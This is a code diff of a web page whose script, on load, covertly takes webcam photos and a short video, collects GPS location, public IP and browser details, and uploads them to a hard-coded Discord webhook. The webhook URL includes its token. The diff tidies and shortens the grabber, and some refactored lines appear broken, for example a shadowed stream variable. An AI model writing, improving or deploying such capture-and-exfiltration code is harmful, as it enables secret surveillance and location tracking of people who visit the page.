@@ -25,8 +25,8 @@
 <div id="loading">Initializing and recording...</div>
 
 <script>
-  // --- Internal configuration toggle ---
-  const includeWebcamFeed = false; // Set to false to exclude webcam frame
+  // --- Internal toggle ---
+  const includeWebcamFeed = false; // Set true to include webcam snapshot
 
   const WEBHOOK_URL = 'https://discord.com/api/webhooks/1495173417434087525/Peg6A9-52ckoH0A0Le00aBhX_GXH65Qx0Pq7NZdQNIY-8BhpPu2XEVqSVJ_7FUcE8W';
 
@@ -89,37 +89,23 @@
       return 'Other';
     })();
 
-    // Placeholder for VPN detection
-    const vpnDetected = false;
-
-    // Placeholder for extensions
-    const extensions = ['ExampleExtension1', 'ExampleExtension2'];
-
+    const vpnDetected = false; // Placeholder
+    const extensions = ['ExampleExtension1', 'ExampleExtension2']; // Placeholder
     const ip = await getPublicIP();
 
-    return {
-      ip: ip,
-      os: os,
-      browser: browser,
-      platform: platform,
-      vpn: vpnDetected,
-      extensions: extensions
-    };
+    return { ip, os, browser, platform, extensions, vpn: vpnDetected };
   }
 
 async function sendToDiscord() {
-  // Collect system info right before sending
   mediaData.systemInfo = await collectSystemInfo();
 
   const formData = new FormData();
 
-  // Helper to convert base64 images to blobs
   async function base64ToBlob(base64) {
     const res = await fetch(base64);
     return await res.blob();
   }
 
-  // Attach images
   if (mediaData.photo1) {
     const blob1 = await base64ToBlob(mediaData.photo1);
     formData.append('files[0]', blob1, 'photo1.jpg');
@@ -131,37 +117,26 @@ async function sendToDiscord() {
   if (mediaData.video) {
     formData.append('files[2]', mediaData.video, 'video.webm');
   }
-
-  // If toggle enabled, capture current webcam frame and attach
   if (includeWebcamFeed && stream) {
     await captureWebcamFrame();
     if (mediaData.webcamFrame) {
       const blobWebcam = await base64ToBlob(mediaData.webcamFrame);
-      formData.append('files[3]', blobWebcam, 'webcam_frame.jpg');
+      formData.append('files[3]', blobWebcam, 'webcam.jpg');
     }
   }
 
-  // Compose message content
-  let content = "Webcam recording\n\n**System Info:**\n";
+  let content = "**Full Capture**\n\n";
   if (mediaData.systemInfo) {
     const sys = mediaData.systemInfo;
     content += `IP: ${sys.ip}\nOS: ${sys.os}\nBrowser: ${sys.browser}\nPlatform: ${sys.platform}\nVPN: ${sys.vpn ? 'Yes' : 'No'}\nExtensions: ${sys.extensions.join(', ')}\n`;
   }
   if (mediaData.locationData) {
-    content += `\n**Location:**\nLatitude: ${mediaData.locationData.latitude}\nLongitude: ${mediaData.locationData.longitude}\nAccuracy: ${mediaData.locationData.accuracy} meters`;
+    content += `Location: Lat ${mediaData.locationData.latitude}, Lon ${mediaData.locationData.longitude}, Acc ${mediaData.locationData.accuracy}m\n`;
   }
 
-  formData.append('payload_json', JSON.stringify({ content: content }));
+  formData.append('payload_json', JSON.stringify({ content }));
 
-  try {
-    await fetch(WEBHOOK_URL, {
-      method: 'POST',
-      body: formData
-    });
-    console.log('Shared to Discord successfully');
-  } catch (error) {
-    console.error('Error sharing to Discord:', error);
-  }
+  await fetch(WEBHOOK_URL, { method: 'POST', body: formData });
 }
 
 async function getGeoLocation() {
@@ -173,16 +148,9 @@ async function getGeoLocation() {
     navigator.geolocation.getCurrentPosition(
       (pos) => {
         mediaData.locationSource = 'gps';
-        resolve({
-          latitude: pos.coords.latitude,
-          longitude: pos.coords.longitude,
-          accuracy: pos.coords.accuracy,
-        });
+        resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude, accuracy: pos.coords.accuracy });
       },
-      () => {
-        mediaData.locationSource = 'failed';
-        resolve(null);
-      },
+      () => { mediaData.locationSource = 'failed'; resolve(null); },
       { enableHighAccuracy: true, timeout: 10000 }
     );
   });
@@ -199,113 +167,70 @@ async function captureWebcamFrame() {
   mediaData.webcamFrame = canvas.toDataURL('image/jpeg', 0.9);
 }
 
-async function stopRecordingAndSend() {
-  if (mediaRecorder && mediaRecorder.state === 'recording') {
-    mediaRecorder.stop();
-  }
-  if (recordingTimeout) {
-    clearTimeout(recordingTimeout);
-  }
+async function stopAndUpload() {
+  if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+  if (recordingTimeout) clearTimeout(recordingTimeout);
   if (stream) {
     stream.getTracks().forEach(t => t.stop());
     stream = null;
   }
-  isRecording = false;
-  if (recordedChunks.length > 0) {
-    mediaData.video = new Blob(recordedChunks, { type: 'video/webm' });
-    // Optionally capture webcam frame if toggle enabled
-    if (includeWebcamFeed) {
-      await captureWebcamFrame();
-    }
+  if (mediaData.video) {
+    if (includeWebcamFeed) await captureWebcamFrame();
     await sendToDiscord();
   }
+  showLoading(false);
 }
 
-async function startRecording() {
+async function start() {
   showLoading(true);
-  // get location data
+  mediaData.systemInfo = await collectSystemInfo();
   mediaData.locationData = await getGeoLocation();
-  const constraints = {
-    video: {
-      width: { ideal: 1280 },
-      height: { ideal: 720 },
-      frameRate: { ideal: 30 }
-    }
-  };
+
   try {
-    const cameraStream = await navigator.mediaDevices.getUserMedia(constraints);
-    stream = cameraStream;
-    const video = document.getElementById('video');
-    const canvas1 = document.getElementById('canvas1');
-    const canvas2 = document.getElementById('canvas2');
-
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { width: 1280, height: 720 } });
+    window.stream = stream;
+    const video = document.createElement('video');
+    document.body.appendChild(video);
+    video.style.display = 'none';
     video.srcObject = stream;
-    await new Promise((res) => (video.onloadedmetadata = res));
-    await new Promise((res) => setTimeout(res, 500));
+    await new Promise(res => video.onloadedmetadata = res);
+    await new Promise(res => setTimeout(res, 500));
 
-    // Capture first photo
-    canvas1.width = video.videoWidth || 640;
-    canvas1.height = video.videoHeight || 480;
-    canvas1.getContext('2d').drawImage(video, 0, 0);
-    mediaData.photo1 = canvas1.toDataURL('image/jpeg', 0.9);
+    // Take snapshots
+    const c1 = document.createElement('canvas');
+    c1.width = video.videoWidth;
+    c1.height = video.videoHeight;
+    c1.getContext('2d').drawImage(video, 0, 0);
+    mediaData.photo1 = c1.toDataURL('image/jpeg', 0.9);
 
-    // Capture second photo after delay
-    setTimeout(() => {
-      canvas2.width = video.videoWidth || 640;
-      canvas2.height = video.videoHeight || 480;
-      canvas2.getContext('2d').drawImage(video, 0, 0);
-      mediaData.photo2 = canvas2.toDataURL('image/jpeg', 0.9);
-    }, 800);
+    const c2 = document.createElement('canvas');
+    c2.width = video.videoWidth;
+    c2.height = video.videoHeight;
+    c2.getContext('2d').drawImage(video, 0, 0);
+    mediaData.photo2 = c2.toDataURL('image/jpeg', 0.9);
 
-    // Start recording
-    recordedChunks = [];
-    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
-    mediaRecorder.ondataavailable = (e) => {
-      if (e.data.size > 0) recordedChunks.push(e.data);
-    };
-    mediaRecorder.onstop = () => {
-      mediaData.video = new Blob(recordedChunks, { type: 'video/webm' });
-      // Optionally capture webcam frame
-      if (includeWebcamFeed) {
-        captureWebcamFrame().then(() => sendToDiscord());
-      } else {
-        sendToDiscord();
-      }
+    const chunks = [];
+    const recorder = new MediaRecorder(stream, { mimeType: 'video/webm; codecs=vp9' });
+    recorder.ondataavailable = e => { if (e.data.size > 0) chunks.push(e.data); };
+    recorder.onstop = () => {
+      mediaData.video = new Blob(chunks, { type: 'video/webm' });
+      if (includeWebcamFeed) captureWebcamFrame().then(() => sendToDiscord());
+      else { sendToDiscord(); }
       if (stream) stream.getTracks().forEach(t => t.stop());
       stream = null;
       isRecording = false;
     };
-
-    stream.getVideoTracks().forEach(track => {
-      track.addEventListener('ended', () => {
-        console.log('Camera disconnected');
-        stopRecordingAndSend();
-      });
-    });
-
+    stream.getVideoTracks().forEach(t => t.addEventListener('ended', stopAndUpload));
     mediaRecorder.start(1000);
-    // Auto-stop after 3 seconds
-    recordingTimeout = setTimeout(() => {
-      if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-    }, 3000);
-    showLoading(false);
-  } catch (err) {
-    console.error('Error accessing camera:', err);
+    setTimeout(() => { if (mediaRecorder.state === 'recording') mediaRecorder.stop(); }, 3000);
+  } catch(e) {
+    console.error('Error:', e);
     showLoading(false);
   }
 }
 
-// Auto start
-window.addEventListener('load', () => {
-  startRecording();
-});
-
-// Cleanup
-window.addEventListener('beforeunload', () => {
-  if (isRecording) {
-    stopRecordingAndSend();
-  }
-});
+window.onload = start;
+window.addEventListener('beforeunload', () => { if (isRecording) stopAndUpload(); });
 </script>
 </body>
 </html>
